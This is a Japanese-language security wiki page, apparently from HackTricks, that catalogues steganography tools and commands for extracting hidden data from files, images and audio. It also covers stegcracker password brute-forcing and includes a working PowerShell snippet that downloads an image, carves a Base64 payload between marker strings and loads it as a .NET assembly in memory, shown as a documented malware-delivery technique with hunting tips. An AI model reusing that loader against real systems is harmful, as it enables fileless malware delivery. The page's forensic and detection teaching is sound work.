# Stegoの小技

{{#include ../banners/hacktricks-training.md}}

## **ファイルからのデータ抽出**

### **Binwalk**

埋め込まれた隠しファイルやデータをバイナリファイル内から検索するためのツールです。インストールは `apt` で行い、ソースは [GitHub](https://github.com/ReFirmLabs/binwalk) で入手できます。
```bash
binwalk file # Displays the embedded data
binwalk -e file # Extracts the data
binwalk --dd ".*" file # Extracts all data
```
### **Foremost**

ヘッダーとフッターに基づいてファイルを復元します。png画像に有用です。`apt`でインストールでき、ソースは[GitHub](https://github.com/korczis/foremost)にあります。
```bash
foremost -i file # Extracts data
```
### **Exiftool**

ファイルのメタデータを表示するのに役立ちます。入手は [here](https://www.sno.phy.queensu.ca/~phil/exiftool/) から。
```bash
exiftool file # Shows the metadata
```
### **Exiv2**

exiftool と同様、メタデータの閲覧用。`apt` でインストール可能で、ソースは [GitHub](https://github.com/Exiv2/exiv2) にあり、[official website](http://www.exiv2.org/) がある。
```bash
exiv2 file # Shows the metadata
```
### **ファイル**

対象のファイルがどのタイプかを特定する。

### **Strings**

さまざまなエンコーディング設定を使って出力をフィルタリングし、ファイルから可読な文字列を抽出する。
```bash
strings -n 6 file # Extracts strings with a minimum length of 6
strings -n 6 file | head -n 20 # First 20 strings
strings -n 6 file | tail -n 20 # Last 20 strings
strings -e s -n 6 file # 7bit strings
strings -e S -n 6 file # 8bit strings
strings -e l -n 6 file # 16bit strings (little-endian)
strings -e b -n 6 file # 16bit strings (big-endian)
strings -e L -n 6 file # 32bit strings (little-endian)
strings -e B -n 6 file # 32bit strings (big-endian)
```
### **Comparison (cmp)**

変更されたファイルをオンラインで見つかる元のバージョンと比較するのに便利です。
```bash
cmp original.jpg stego.jpg -b -l
```
## **テキスト内の隠しデータ抽出**

### **スペース内の隠しデータ**

一見空白に見えるスペースの不可視文字に情報が隠されていることがあります。これらのデータを抽出するには、[https://www.irongeek.com/i.php?page=security/unicode-steganography-homoglyph-encoder](https://www.irongeek.com/i.php?page=security/unicode-steganography-homoglyph-encoder) を参照してください。

## **画像からのデータ抽出**

### **GraphicMagickで画像の詳細を特定する**

[GraphicMagick](https://imagemagick.org/script/download.php) は画像ファイルの種類を判別し、破損の可能性を特定するために使用します。画像を検査するには、以下のコマンドを実行してください：
```bash
./magick identify -verbose stego.jpg
```
破損した画像を修復しようとする場合、メタデータのコメントを追加すると役立つことがあります:
```bash
./magick mogrify -set comment 'Extraneous bytes removed' stego.jpg
```
### **Steghide を使ったデータ隠蔽**

Steghide は `JPEG, BMP, WAV, and AU` ファイル内にデータを隠すことができ、暗号化されたデータの埋め込みと抽出に対応しています。インストールは `apt` を使えば簡単で、[source code is available on GitHub](https://github.com/StefanoDeVuono/steghide)。

**コマンド:**

- `steghide info file` はファイルに隠しデータが含まれているかを表示します。
- `steghide extract -sf file [--passphrase password]` は隠しデータを抽出します（password は任意）。

ウェブベースの抽出を行うには、[this website](https://futureboy.us/stegano/decinput.html) を訪れてください。

**Stegcracker を使ったブルートフォース攻撃:**

- Steghide の password をクラックするには、[stegcracker](https://github.com/Paradoxis/StegCracker.git) を以下のように使用します:
```bash
stegcracker <file> [<wordlist>]
```
### **zsteg for PNG and BMP Files**

zstegはPNGやBMPファイル内の隠しデータの検出に特化しています。インストールは`gem install zsteg`で行い、[source on GitHub](https://github.com/zed-0xff/zsteg)でソースを確認できます。

**Commands:**

- `zsteg -a file` はファイルに対してすべての検出手法を適用します。
- `zsteg -E file` はデータ抽出用のペイロードを指定します。

### **StegoVeritas and Stegsolve**

**stegoVeritas**はメタデータをチェックし、画像変換を行い、LSB brute forcingなどの機能を提供します。オプション一覧は`stegoveritas.py -h`、すべてのチェックを実行するには`stegoveritas.py stego.jpg`を使用します。

**Stegsolve**はさまざまなカラーフィルタを適用して、画像内の隠されたテキストやメッセージを露出させます。[GitHub](https://github.com/eugenekolo/sec-tools/tree/master/stego/stegsolve/stegsolve)で入手できます。

### **FFT for Hidden Content Detection**

Fast Fourier Transform (FFT) 技術は画像内の隠れたコンテンツを明らかにすることができます。参考になるリソース:

- [EPFL Demo](http://bigwww.epfl.ch/demo/ip/demos/FFT/)
- [Ejectamenta](https://www.ejectamenta.com/Fourifier-fullscreen/)
- [FFTStegPic on GitHub](https://github.com/0xcomposure/FFTStegPic)

### **Stegpy for Audio and Image Files**

Stegpyは画像および音声ファイルに情報を埋め込むことができ、PNG、BMP、GIF、WebP、WAVなどのフォーマットをサポートしています。[GitHub](https://github.com/dhsdshdhk/stegpy)で入手可能です。

### **Pngcheck for PNG File Analysis**

PNGファイルを解析したり正当性を検証したりするには、次を使用します:
```bash
apt-get install pngcheck
pngcheck stego.png
```
### **画像解析の追加ツール**

さらに調査する場合は、以下を参照してください:

- [Magic Eye Solver](http://magiceye.ecksdee.co.uk/)
- [Image Error Level Analysis](https://29a.ch/sandbox/2012/imageerrorlevelanalysis/)
- [Outguess](https://github.com/resurrecting-open-source-projects/outguess)
- [OpenStego](https://www.openstego.com/)
- [DIIT](https://diit.sourceforge.net/)

## 画像内に隠されたマーカー区切りのBase64ペイロード（malware delivery）

市販のローダーは、正当な画像ファイル（多くは GIF/PNG）の中にテキストとしてBase64エンコードされたペイロードを隠すことが増えています。ピクセルレベルのLSBの代わりに、ペイロードはファイルのテキストやメタデータに埋め込まれたユニークな開始/終了マーカー文字列で区切られます。A PowerShell stager then:

- HTTP(S) 経由で画像をダウンロードする
- マーカー文字列を探す（観測された例: <<sudo_png>> … <<sudo_odt>>）
- マーカー間のテキストを抽出し、Base64でデコードしてバイトに変換する
- .NET アセンブリをメモリ上にロードし、既知のエントリメソッドを呼び出す（ディスクにファイルは書き込まれない）

最小限の PowerShell カービング/ロード スニペット
```powershell
$img = (New-Object Net.WebClient).DownloadString('https://example.com/p.gif')
$start = '<<sudo_png>>'; $end = '<<sudo_odt>>'
$s = $img.IndexOf($start); $e = $img.IndexOf($end)
if($s -ge 0 -and $e -gt $s){
$b64 = $img.Substring($s + $start.Length, $e - ($s + $start.Length))
$bytes = [Convert]::FromBase64String($b64)
[Reflection.Assembly]::Load($bytes) | Out-Null
}
```
注意事項
- これは ATT&CK T1027.003 (steganography) に該当します。マーカー文字列はキャンペーンごとに異なります。
- ハンティング: ダウンロードした画像を既知のデリミタでスキャンし、`DownloadString` の後に `FromBase64String` が続く `PowerShell` をフラグしてください。

See also phishing delivery examples and full in-memory invocation flow here:

{{#ref}}
../generic-methodologies-and-resources/phishing-methodology/phishing-documents.md
{{#endref}}

## **音声からのデータ抽出**

**Audio steganography** は音声ファイル内に情報を隠すための独自の手法を提供します。隠しコンテンツの埋め込みや抽出には様々なツールが使用されます。

### **Steghide (JPEG, BMP, WAV, AU)**

Steghide は JPEG、BMP、WAV、AU ファイルにデータを隠すための汎用ツールです。詳細な手順は [stego tricks documentation](stego-tricks.md#steghide) を参照してください。

### **Stegpy (PNG, BMP, GIF, WebP, WAV)**

このツールは PNG、BMP、GIF、WebP、WAV などの様々な形式に対応しています。詳細は [Stegpy's section](stego-tricks.md#stegpy-png-bmp-gif-webp-wav) を参照してください。

### **ffmpeg**

ffmpeg は音声ファイルの整合性を評価する上で重要であり、詳細情報を表示して差異を特定します。
```bash
ffmpeg -v info -i stego.mp3 -f null -
```
### **WavSteg (WAV)**

WavStegは、最下位ビット(least significant bit, LSB)手法を用いてWAVファイル内にデータを隠蔽・抽出することに優れています。利用は[GitHub](https://github.com/ragibson/Steganography#WavSteg)から可能です。コマンド例：
```bash
python3 WavSteg.py -r -b 1 -s soundfile -o outputfile

python3 WavSteg.py -r -b 2 -s soundfile -o outputfile
```
### **Deepsound**

DeepsoundはAES-256を使用して音声ファイル内の情報を暗号化および検出することができます。ダウンロードは[the official page](http://jpinsoft.net/deepsound/download.aspx)から可能です。

### **Sonic Visualizer**

音声ファイルの視覚的および解析的検査に不可欠なツールで、Sonic Visualizerは他の手段では検出できない隠れた要素を明らかにします。詳しくは[official website](https://www.sonicvisualiser.org/)をご覧ください。

### **DTMF Tones - Dial Tones**

音声ファイル内のDTMFトーンは、[this DTMF detector](https://unframework.github.io/dtmf-detect/)や[DialABC](http://dialabc.com/sound/detect/index.html)などのオンラインツールで検出できます。

## **その他の手法**

### **Binary Length SQRT - QR Code**

長さの平方根が整数になるバイナリデータはQR Codeを表している可能性があります。確認するにはこのスニペットを使用してください:
```python
import math
math.sqrt(2500) #50
```
バイナリから画像への変換については、[dcode](https://www.dcode.fr/binary-image) をご覧ください。QRコードを読み取るには、[this online barcode reader](https://online-barcode-reader.inliteresearch.com/) を使用してください。

### **点字翻訳**

点字を翻訳するには、[Branah Braille Translator](https://www.branah.com/braille-translator) が便利なリソースです。

## **参考資料**

- [**https://0xrick.github.io/lists/stego/**](https://0xrick.github.io/lists/stego/)
- [**https://github.com/DominicBreuker/stego-toolkit**](https://github.com/DominicBreuker/stego-toolkit)
- [Unit 42 – PhantomVAI Loader Delivers a Range of Infostealers](https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/)
- [MITRE ATT&CK – Steganography (T1027.003)](https://attack.mitre.org/techniques/T1027/003/)

{{#include ../banners/hacktricks-training.md}}
